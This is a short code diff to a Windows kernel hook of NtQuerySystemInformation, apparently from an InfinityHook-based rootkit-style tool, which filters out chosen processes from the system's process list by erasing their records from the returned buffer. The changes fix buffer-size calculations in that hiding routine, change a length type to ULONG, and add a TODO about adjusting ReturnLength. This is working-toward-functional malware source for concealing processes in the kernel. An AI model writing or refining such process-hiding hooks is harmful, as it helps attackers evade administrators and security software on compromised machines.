@@ -68,7 +68,7 @@ NTSTATUS DetourNtQuerySystemInformation(
 		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
 
         if (ProcessInformationPtr) {
-			LONG LastEntrySize = GetLastEntrySize(*ReturnLength, ProcessInformationPtr);
+			ULONG LastEntrySize = GetLastEntrySize(*ReturnLength, ProcessInformationPtr);
             while (1) {
                 //kprintf("[+] infinityhook: NtQuerySystemInformation: PID: %d\n", ProcessInformationPtr->UniqueProcessId);
                 WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
@@ -95,7 +95,7 @@ NTSTATUS DetourNtQuerySystemInformation(
 							TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)TempProcessInformationPtr + TempProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
 						}
 						// last record size
-						ProcessInformationBufferSizeToEnd += sizeof(SYSTEM_PROCESS_INFORMATION); // TODO - fix - add last name length
+						ProcessInformationBufferSizeToEnd += LastEntrySize;
 
 						// next structure address - start copying from there
 						SYSTEM_PROCESS_INFORMATION* NextProcessInformationStructAddr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
@@ -114,7 +114,7 @@ NTSTATUS DetourNtQuerySystemInformation(
 						// TODO - should not be FILE_DIRECTORY_INFORMATION here - fix!!!
 						// length should be PROBABLY be sizeof(SYSTEM_PROCESS_INFORMATION) + NameLength * sizeof(wchar)
 						// erease this FileInformation structure
-						memset(ProcessInformationPtr, 0, sizeof(FILE_DIRECTORY_INFORMATION));
+						memset(ProcessInformationPtr, 0, LastEntrySize);
 						break;
 					}
 				}
@@ -125,5 +125,6 @@ NTSTATUS DetourNtQuerySystemInformation(
         }
 	}
 	
+	// TODO - decrease ReturnLength - we may have removed some data
 	return OriginalStatus;
 }
